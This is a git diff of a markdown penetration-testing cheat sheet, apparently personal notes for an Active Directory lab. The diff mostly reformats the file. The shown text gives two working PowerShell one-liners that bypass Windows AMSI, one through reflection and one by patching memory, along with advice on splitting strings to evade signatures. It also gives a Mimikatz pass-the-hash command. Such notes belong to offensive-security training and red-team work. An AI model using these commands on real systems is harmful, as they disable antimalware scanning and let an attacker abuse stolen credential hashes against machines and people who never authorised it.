@@ -255,13 +255,14 @@ Includes web services (not just port 80)
 
 ## AMSI Bypasses
 - You may need to split up the string in some way (ex. triggers on AmsiUtils or amsi):
-		```
+  ```
   [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
   ```
- - Simple one-liner to force a 0 in memory to fail the CMP instruction and get a 1 return value on Amsi checks (pass the scan). Might want to rip that up into a bunch of lines if possible:
-	 ```
+- Simple one-liner to force a 0 in memory to fail the CMP instruction and get a 1 return value on Amsi checks (pass the scan). Might want to rip that up into a bunch of lines if possible:
+  ```
   $a=[Ref].Assembly.GetTypes();Foreach($b in $a) {if ($b.Name -like "*iUtils") {$c=$b}};$d=$c.GetFields('NonPublic,Static');Foreach($e in $d) {if ($e.Name -like "*Context") {$f=$e}};$g=$f.GetValue($null);[IntPtr]$ptr=$g;[Int32[]]$buf = @(0);[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $ptr, 1)
   ```
+- Patch the internals with powershell reflection. See OneNote tagged `AMSI Bypass`.
 
 ## Mimikatz
 You can wrap these in for ex. `PS> Invoke-Mimikatz -Command '"sekurlsa::pth /user:lemons /domain:dollarcorp.moneycorp.local /ntlm:NThashHERE /run:powershell.exe`
